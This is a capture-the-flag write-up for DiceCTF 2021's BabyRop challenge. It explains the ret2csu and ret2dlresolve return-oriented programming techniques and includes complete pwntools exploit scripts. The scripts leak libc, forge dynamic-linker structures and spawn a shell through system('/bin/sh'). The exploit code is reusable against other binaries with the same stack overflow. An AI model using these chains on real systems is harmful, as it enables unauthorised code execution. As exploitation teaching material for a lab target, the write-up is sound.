# DiceCTF21 BabyRop
In this challenge we are presented with an extremely simple program:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[64]; // [rsp+0h] [rbp-40h] BYREF

  write(1, "Your name: ", 0xBuLL);
  gets(v4);
  return 0;
}
```

The simplicity of the program is an issue for us. We have very few gadgets to use, and we only have `write` and `gets` available to call in the plt.
`write` in particular is a problem since it requires 3 parameters and on 64bit we need an appropriate gadget to modify rdx.
Looking through ropper's output, there aren't many interesting gadgets.

There are 2 techniques we can choose to solve this challenge without getting a headache: **ret2csu** and **ret2dl**.
I will not explain them in detail, but I will provide the source code in which I use these techniques and I will give a gist of how they work.
I recommend checking out the links to have a proper explanation on these techniques.


# ret2csu
<https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf>

This is the easier technique to understand out of the two. 
The downside is that it is not nearly as powerful as ret2dl but it is still good to know.

Executables on Linux have a `__libc_csu_init()` function.
The purpose of this function is to call all of the init_array functions.
This function is interesting because it provides us gadgets to call a function, 3rd parameter included.

# ret2dl
<https://syst3mfailure.github.io/ret2dl_resolve>

This technique is extremely powerful.
We're basically creating fake 'dynamic lookup' entries so that we can call, for example, `system` *without* needing to leak libc base address first.
We're simply making the linker do the dirty work for us, as if we had a `system` entry in the .plt!

What we do need to know is the program's base address.
We also need to have writeable memory, and the location of this memory. It cannot be too far away from the program base because of 32 bit indexes.
Then we need call the plt lookup function with an argument on the stack.
I wonder if it's feasible to use this technique without a ROP.

`pwntools` has an amazing function to create ret2dl payloads for you.
<https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html>

It makes ret2dl very easy to use, however I recommend knowing how to make the payloads yourself as well.
It'll be useful when something goes wrong and you need to debug your exploit.
Also I believe there are situations where the pwntools function will be unusable, as it assumes that the memory is contiguous. There might be challenges in which you need to split the ret2dl payload in multiple pieces, and splitting the payload provided by pwntools will not work as it would break all of the indexes inside.

# Source Code
Here is the source code I wrote while learning these two techniques.
I believe they are fairly well-commented, and they will definitely help you when learning these techniques yourself.
Obviously you should first read and understand the papers / writeups I linked above.

## ret2csu
```python
def ret2csu(callfuncptr, edi, rsi, rdx, retfunc, *, elf=None, gadget1=None, gadget2=None, 
            rbx_after=0, rbp_after=0, r12_after=0, r13_after=0, r14_after=0, r15_after=0):
    '''
    gadget2:
    mov     rdx, r14
    mov     rsi, r13
    mov     edi, r12d
    call    qword ptr [r15+rbx*8]
    add     rbx, 1
    cmp     rbp, rbx
    jnz     short loc_401178
    add     rsp, 8
    gadget1:
    pop     rbx
    pop     rbp
    pop     r12
    pop     r13
    pop     r14
    pop     r15
    ret
    '''

    if gadget1 == None:
        assert elf != None

        # compiled from pop rbx ... ret
        gadget1_bytes = b'[]A\\A]A^A_\xc3'
        gadget1 = next(elf.search(gadget1_bytes, executable=True))
        log.info(f'Found ret2csu gadget1 at {hex(gadget1)}')

    if gadget2 == None:
        assert elf != None

        # compiled from mov rdx, r14 .... cmp rbp, rbx
        gadget2_bytes = b'L\x89\xf2L\x89\xeeD\x89\xe7A\xff\x14\xdfH\x83\xc3\x01H9\xdd'
        gadget2 = next(elf.search(gadget2_bytes, executable=True))
        log.info(f'Found ret2csu gadget2 at {hex(gadget2)}')


    payload  = b''
    # Jumping to the first gadget
    payload += p64(gadget1)
    
     # rbx, which is then multiplied by 8 
     # and added to r15 in the call as offset
     # So we just set it to 0
    payload += p64(0x0)

    # rbx has to be 0 and 1 less of rbp 
    # (look at the add, cmp, jnz after gadget 2)
    # So we set rbp to 1
    payload += p64(0x1)

    # r12, which is then moved to edi by gadget 2.
    # So I this might be a problem sometimes,
    # We're only setting 32 bits for the first parameter.
    payload += p64(edi)

    # r13, which is then moved to rsi by gadget 2.
    payload += p64(rsi)

    # r14, which is then moved to rdx by gadget 2.
    payload += p64(rdx)

    # r15, which is then dereferenced and used as function pointer to call.
    # So it has to be a pointer to a function pointer.
    payload += p64(callfuncptr)

    # Now we are finally jumping to the second gadget.
    payload += p64(gadget2)

    # After the call, we'll go back to gadget1, with all the pops.
    # We have to take these into account if we do not want to 
    # mess up our stack.
    payload += p64(0)   # This is for the "add rsp, 8"

    # The pops
    payload += p64(rbx_after)
    payload += p64(rbp_after)
    payload += p64(r12_after)
    payload += p64(r13_after)
    payload += p64(r14_after)
    payload += p64(r15_after)

    # Finish the ret2csu, returning to wherever we want.
    payload += p64(retfunc)

    return payload

def ret2csu_exploit():
    ret2csu_payload = ret2csu(exe.got['write'], 1, exe.got['write'], 8, exe.sym['main'], elf=exe)

    # First Stage
    p.sendlineafter('name: ', b'a'*0x48 + ret2csu_payload)
    write_leak = u64(p.recv(6) + b'\x00\x00')
    libc.address = write_leak - libc.sym['__write']
    log.info(f'libc write: {hex(write_leak)}')
    log.info(f'libc: {hex(libc.address)}')

    # Second Stage
    pop_rdi = 0x4011d3
    ret = 0x4011d3+1
    binsh = next(libc.search(b'/bin/sh'))

    # You may have to remove the ret after binsh, it depends on the machine.
    # This is so that it works on the challenge server.
    p.sendlineafter('name: ',b'a'*0x48 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(libc.sym['system']))

    p.interactive()
```

## ret2dl

```python
def ret2dl_exploit():
    rop = ROP(exe)
    dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"], data_addr=0x404038)
    rop.call('gets', [dlresolve.data_addr])
    rop.ret2dlresolve(dlresolve)
    raw_rop = rop.chain()
    log.info(rop.dump())

    # You may have to remove the ret before the rop, it depends on the machine.
    # This is so that it works on the challenge server.
    ret = 0x4011d3+1
    p.sendlineafter('name: ', fit({0x48: p64(ret) + raw_rop}))

    log.info(f'Sending dlresolve payload at address {hex(dlresolve.data_addr)}:\n{hexdump(dlresolve.payload)}')
    p.sendline(dlresolve.payload)
    p.interactive()

def ret2dl_exploit_manual():
    data_addr = 0x404030

    # The section addresses we need to know
    # symtab and strtab give me NULL with readelf and get_section_by_name
    # I do not know why rela plt works
    # they're both defined in the .dynamic section so I don't know the difference
    log.info(f'elf address: {hex(exe.address)}')
    log.info(f'elf load address: {hex(exe.load_addr)}')
    relaplt = exe.get_section_by_name('.rela.plt').header.sh_addr
    symtab = exe.dynamic_value_by_tag("DT_SYMTAB")
    strtab = exe.dynamic_value_by_tag("DT_STRTAB")

    log.info(f'.rela.plt (DT_JMPREL): {hex(relaplt)}')
    log.info(f'.symtab: {hex(symtab)}')
    log.info(f'.strtab: {hex(strtab)}')

    # const PLTREL *const reloc = (const void *) (JMPREL + reloc_offset);
    # Searches in .rela.plt for the corresponding Elf64_Rel
    # reloc offset is reloc_arg * 0x18
    # reloc_arg is what we will push to the stack, as argument to _dl_fixup
    # Elf64_Rel is 0x18 aligned for some reason, even though it is 0x10 bytes long
    assert (data_addr - relaplt) % 0x18 == 0, 'Needs 0x18 alignment!'
    reloc_arg = p64((data_addr - relaplt) // 0x18)

    # We will place a fake Elf64_Rel struct in data_addr.
    # r_offset contains the destination address for the relocation.
    # Where the libc address of the requested function will be saved.
    # Normally the got.
    # I guess you could make it point to a readable area for a leak if you ever need it.
    # It seems redundant with ret2dl at disposal but who knows.
    # r_info is used as symbol table index (most important 32 bits),
    # 32 bits = We might have problems if data_addr is really far away from symtab.
    # The other 32 bits are used to indicate relocation type.
    # We want it to be set to 7, otherwise the sanity check fails.
    # It has to be ELF_MACHINE_JMP_SLOT, which means plt relocation type.
    # const ElfW(Sym) *sym = &symtab[reloc->r_info >> 32]
    # Elf64_Sym is also 0x18 aligned
    r_offset = p64(data_addr)
    relocation_type = 7
    assert (data_addr + 0x18 - symtab) % 0x18 == 0, 'Needs 0x18 alignment!'
    symtab_index = (data_addr + 0x18 - symtab) // 0x18
    r_info = p64((symtab_index << 32) | relocation_type)
    elf64_rel = r_offset + r_info + b'a'*8

    # Now we define the Elf64_Sym we pointed to earlier
    # st_name is the index of the string symbol from strtab
    # So this is very important, it's the name of the function we want to call
    # There's no alignment to be done for it
    # st_info is used to check for indirect functions. STT_GNU_IFUNC	10
    # I verified that setting st_info = 10 breaks the exploit.
    # I don't actually have any idea how ifuncs differ under the hood.
    # st_other contains a VISIBILITY flag inside of it.
    # Should be the 2 least important bits (sym->st_other & 0x03)
    # These have to be set to 0, otherwise it means that the symbol was already resolved.
    # So we just set the whole thing to 0.
    # st_shndx is the 'section index' of the symbol?
    # something really weird and scary that I do not want to understand.
    # It does not seem to be used by dl-runtime.c anyway...
    # st_value is the 'value' of the symbol. Again, no idea.
    # st_size is supposed to be the symbol length? With 0 = unknown
    # Although it does not seem to be used in dl-runtime.c
    # And changing its value does not affect the exploit
    st_name = p32(data_addr + 0x30 - strtab)
    st_info = p8(0) # do not set to 10 lol
    st_other = p8(0x0) # Needed to pass a check
    st_shndx = p16(0x0) # Irrelevant?
    st_value = p64(0x0) # Irrelevant?
    st_size = p64(0x0) # Irrelevant? 0 = symbol size unknown
    elf64_sym = st_name + st_info + st_other + st_shndx + st_value + st_size

    # After this we'll have the symbol string.
    # Next to it I'm putting the bin sh string too,
    # which we will use as argument for system.
    func = b'system\x00'
    arg = b'/bin/sh\x00'
    binsh_addr = data_addr + 0x30 + len(func)

    payload = elf64_rel + elf64_sym + func + arg

    # Defining the rop
    # Write data on data_addr
    rop = ROP(exe)
    rop.call('gets', [data_addr])

    # The call to the default plt stub
    # We set parameters as normal, as if we are really calling system,
    # After it gets resolved the registers will be restored, rdi included
    # In 32bit I guess it works automatically thanks to the stack
    rop.call(0x401020, [binsh_addr])
    raw_rop = rop.chain()
    log.info(rop.dump())

    # Send the rop and reloc_arg, with an additional ret for stack alignment
    # You may have to remove the ret, it depends on the machine.
    # This is so that it works on the challenge server.
    ret = 0x4011d3+1
    p.sendlineafter('name: ', fit({0x48: p64(ret) + raw_rop + reloc_arg}))
    log.info(f'Reloc Arg: {hex(u64(reloc_arg))}')

    # Send the relocation and symbol structs, the symbol, and the argument
    log.info(f'Sending dlresolve payload at address {hex(data_addr)}:\n{hexdump(payload)}')
    p.sendline(payload)

    # Get shell
    p.interactive()
```